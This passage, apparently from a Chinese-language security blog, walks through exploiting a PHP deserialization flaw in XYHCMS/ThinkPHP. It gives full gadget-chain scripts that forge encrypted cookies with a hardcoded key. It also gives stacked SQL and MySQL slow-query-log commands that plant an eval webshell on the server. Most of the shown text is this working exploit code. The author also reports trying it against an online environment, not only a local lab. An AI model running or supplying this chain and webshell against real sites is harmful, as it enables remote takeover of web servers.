class_\">Think</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$options</span>   = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$pk</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$data</span> = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$db</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;db = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Db\\Driver\\Mysql</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;options[<span class=\"string\">&#x27;where&#x27;</span>] = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;pk = <span class=\"string\">&#x27;luoke&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;data[<span class=\"variable language_\">$this</span>-&gt;pk] = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">&quot;table&quot;</span> =&gt; <span class=\"string\">&quot;xyh_admin_log&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;where&quot;</span> =&gt; <span class=\"string\">&quot;id=0;&quot;</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Session</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Memcache</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$handle</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;handle = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Model</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Image</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Imagick</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$img</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;img = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Session\\Driver\\Memcache</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Common</span>\\<span class=\"title class_\">Lib</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SysCrypt</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$crypt_key</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$crypt_key</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable language_\">$this</span> -&gt; crypt_key = <span class=\"variable\">$crypt_key</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">php_encrypt</span>(<span class=\"params\"><span class=\"variable\">$txt</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">srand</span>((<span class=\"keyword\">double</span>)<span class=\"title function_ invoke__\">microtime</span>() * <span class=\"number\">1000000</span>);</span><br><span class=\"line\">\t   <span class=\"variable\">$encrypt_key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">0</span>,<span class=\"number\">32000</span>));</span><br><span class=\"line\">\t   <span class=\"variable\">$ctr</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>);<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$ctr</span> = <span class=\"variable\">$ctr</span> == <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$encrypt_key</span>) ? <span class=\"number\">0</span> : <span class=\"variable\">$ctr</span>;</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>].(<span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>++]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"built_in\">self</span>::<span class=\"title function_ invoke__\">__key</span>(<span class=\"variable\">$tmp</span>,<span class=\"variable\">$this</span> -&gt; crypt_key));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">php_decrypt</span>(<span class=\"params\"><span class=\"variable\">$txt</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$txt</span> = <span class=\"built_in\">self</span>::<span class=\"title function_ invoke__\">__key</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$txt</span>),<span class=\"variable\">$this</span> -&gt; crypt_key);</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>;<span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$md5</span> = <span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>];</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$txt</span>[++<span class=\"variable\">$i</span>] ^ <span class=\"variable\">$md5</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__key</span>(<span class=\"params\"><span class=\"variable\">$txt</span>,<span class=\"variable\">$encrypt_key</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$encrypt_key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$encrypt_key</span>);</span><br><span class=\"line\">\t   <span class=\"variable\">$ctr</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$ctr</span> = <span class=\"variable\">$ctr</span> == <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$encrypt_key</span>) ? <span class=\"number\">0</span> : <span class=\"variable\">$ctr</span>;</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>] ^ <span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>++];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable language_\">$this</span> -&gt; crypt_key = <span class=\"literal\">null</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_cookie</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$key</span> = <span class=\"string\">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"string\">&#x27;iqQmhxkAU&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$sc</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Common\\Lib\\SysCrypt</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"variable\">$sc</span>-&gt;<span class=\"title function_ invoke__\">php_decrypt</span>(<span class=\"variable\">$name</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$value</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">set_cookie</span>(<span class=\"params\"><span class=\"variable\">$args</span>, <span class=\"variable\">$key</span> = <span class=\"string\">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"string\">&#x27;iqQmhxkAU&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$args</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$sc</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Common\\Lib\\SysCrypt</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"variable\">$sc</span>-&gt;<span class=\"title function_ invoke__\">php_encrypt</span>(<span class=\"variable\">$value</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$value</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Image\\Driver\\Imagick</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">set_cookie</span>(<span class=\"variable\">$b</span>,<span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;+&#x27;</span>,<span class=\"string\">&#x27;%2B&#x27;</span>,<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>生成序列化参数：</p>\n<p><img src=\"fYTXF1j0zAW7xLY0_XL_3JjJDuz6l9FppNdLwjNsQlU.png\" alt=\"image\"></p>\n<p>发送数据，成功伪造。</p>\n<p><img src=\"E3fk_uE2hgCWH1pNmmWIlQhE-TrBubkoRt-GLGb-P88.png\" alt=\"image\"></p>\n<p>查看结果</p>\n<p><img src=\"PmVtCUB-IQ2Xk_BzDO6xleiXM2H7fHhOjSehl74smIA.png\" alt=\"image\"></p>\n<h3 id=\"反序列化漏洞MySQL日志写shell\"><a href=\"#反序列化漏洞MySQL日志写shell\" class=\"headerlink\" title=\"反序列化漏洞MySQL日志写shell\"></a>反序列化漏洞MySQL日志写shell</h3><p>开启慢查询日志：</p>\n<p><code>set global slow_query_log=1;</code></p>\n<p>指定慢查询日志的位置：</p>\n<p><code>set global slow_query_log_file=&#39;C:/phpstudy_pro/WWW/xyh.com/shell.php&#39;;</code></p>\n<p>生成反序列化，然后构造之后发包请求，成功写入shell，（这里需要注意在一句话木马的变量传参中添加个转义“\\”，不然不能完整写入）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Db</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">PDO</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Mysql</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$options</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        PDO::<span class=\"variable constant_\">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class=\"literal\">true</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$config</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">&quot;dsn&quot;</span>    =&gt; <span class=\"string\">&quot;mysql:host=localhost;dbname=xyhcms;port=3306&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;username&quot;</span> =&gt; <span class=\"string\">&quot;root&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;password&quot;</span> =&gt; <span class=\"string\">&quot;qweas123&quot;</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$options</span>   = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$pk</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$data</span> = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$db</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">protected</span> <span class=\"variable\">$poss</span> = <span class=\"string\">&#x27;$_POST[1]&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;db = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Db\\Driver\\Mysql</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;options[<span class=\"string\">&#x27;where&#x27;</span>] = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;pk = <span class=\"string\">&#x27;luoke&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;data[<span class=\"variable language_\">$this</span>-&gt;pk] = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">&quot;table&quot;</span> =&gt; <span class=\"string\">&quot;xyh_admin_log&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;where&quot;</span> =&gt; <span class=\"string\">&quot;id=0;select &#x27;&lt;?php @eval(\\$_POST[1]);?&gt;&#x27; or sleep(11);&quot;</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Session</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Memcache</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$handle</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;handle = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Model</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Image</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Imagick</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$img</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;img = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Session\\Driver\\Memcache</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Common</span>\\<span class=\"title class_\">Lib</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SysCrypt</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$crypt_key</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$crypt_key</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable language_\">$this</span> -&gt; crypt_key = <span class=\"variable\">$crypt_key</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">php_encrypt</span>(<span class=\"params\"><span class=\"variable\">$txt</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">srand</span>((<span class=\"keyword\">double</span>)<span class=\"title function_ invoke__\">microtime</span>() * <span class=\"number\">1000000</span>);</span><br><span class=\"line\">\t   <span class=\"variable\">$encrypt_key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">0</span>,<span class=\"number\">32000</span>));</span><br><span class=\"line\">\t   <span class=\"variable\">$ctr</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>);<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$ctr</span> = <span class=\"variable\">$ctr</span> == <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$encrypt_key</span>) ? <span class=\"number\">0</span> : <span class=\"variable\">$ctr</span>;</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>].(<span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>++]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"built_in\">self</span>::<span class=\"title function_ invoke__\">__key</span>(<span class=\"variable\">$tmp</span>,<span class=\"variable\">$this</span> -&gt; crypt_key));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">php_decrypt</span>(<span class=\"params\"><span class=\"variable\">$txt</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$txt</span> = <span class=\"built_in\">self</span>::<span class=\"title function_ invoke__\">__key</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$txt</span>),<span class=\"variable\">$this</span> -&gt; crypt_key);</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>;<span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$md5</span> = <span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>];</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$txt</span>[++<span class=\"variable\">$i</span>] ^ <span class=\"variable\">$md5</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__key</span>(<span class=\"params\"><span class=\"variable\">$txt</span>,<span class=\"variable\">$encrypt_key</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$encrypt_key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$encrypt_key</span>);</span><br><span class=\"line\">\t   <span class=\"variable\">$ctr</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$ctr</span> = <span class=\"variable\">$ctr</span> == <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$encrypt_key</span>) ? <span class=\"number\">0</span> : <span class=\"variable\">$ctr</span>;</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>] ^ <span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>++];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable language_\">$this</span> -&gt; crypt_key = <span class=\"literal\">null</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_cookie</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$key</span> = <span class=\"string\">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"string\">&#x27;iqQmhxkAU&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$sc</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Common\\Lib\\SysCrypt</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"variable\">$sc</span>-&gt;<span class=\"title function_ invoke__\">php_decrypt</span>(<span class=\"variable\">$name</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$value</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">set_cookie</span>(<span class=\"params\"><span class=\"variable\">$args</span>, <span class=\"variable\">$key</span> = <span class=\"string\">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"string\">&#x27;iqQmhxkAU&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$args</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$sc</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Common\\Lib\\SysCrypt</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"variable\">$sc</span>-&gt;<span class=\"title function_ invoke__\">php_encrypt</span>(<span class=\"variable\">$value</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$value</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Image\\Driver\\Imagick</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">set_cookie</span>(<span class=\"variable\">$b</span>,<span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;+&#x27;</span>,<span class=\"string\">&#x27;%2B&#x27;</span>,<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>至此成功在本地window搭建的phpstudy环境getshell</p>\n<p><img src=\"t22_CJfnGW30lPSRUDfvHVW7eMb-apXIZJCG6FufS5A.png\" alt=\"image\"></p>\n<h3 id=\"尝试线上环境\"><a href=\"#尝试线上环境\" class=\"headerlink\" title=\"尝试线上环境\"></a>尝试线上环境</h3><p>当我喜出望外拿这个方法到线上去测试的时候，发现现实是残酷的。</p>\n<p>所有的请求都成功了，但是就是写不进shell。</p>\n<p><img src=\"KRbUGAMappm9vWkUegnjQZ4IYxITmii9VlbjK-SrcLM.png\" alt=\"image\"></p>\n<p><img src=\"uJ8rZ6J9WCZjVo2Tt8hwpxtKmU-0Hbvl_1fQ3MUjQ7I.png\" alt=\"image\"></p>\n<p>于是放弃了，然后打算再重新捋一遍，然后在本地搭建模拟线上的环境。</p>\n<h2 id=\"本地搭建宝塔环境测试\"><a href=\"#本地搭建宝塔环境测试\" class=\"headerlink\" title=\"本地搭建宝塔环境测试\"></a>本地搭建宝塔环境测试</h2><p>使用宝塔搭建完成靶场之后，开始前面的一系列反序列化堆叠注入日志写shell的操作。</p>\n<p>发现也也不进去，看了一下是权限的问题，文件夹改成了777权限之后，成功写入shell</p>\n<p><img src=\"DIQWoMJ_NVZj5nrH-RQxTIVoAzdfQ62PVEvBB6495ZU.png\" alt=\"image\"></p>\n<p>尝试连接，发现没用访问权限</p>\n<p><img src=\"g0QWjEryttjtJuLqTGada2w_u7wKAIvFLTspWp20pAg.png\" alt=\"image\"></p>\n<p>使用chown更改属组之后，才能正常访问，也就是说想通过反序列化堆叠SQL日志写shell是几乎不可能的</p>\n<p><img src=\"G52gO9m7CdHkMk_Wo9KYGDCpw5vZFkgOcqm0s9a7JiI.png\" alt=\"image\"></p>\n<p><img src=\"VFsSqvesJ50Vn2TN92fkr8MqUInV_KZnG41nyF7GtlQ.png\" 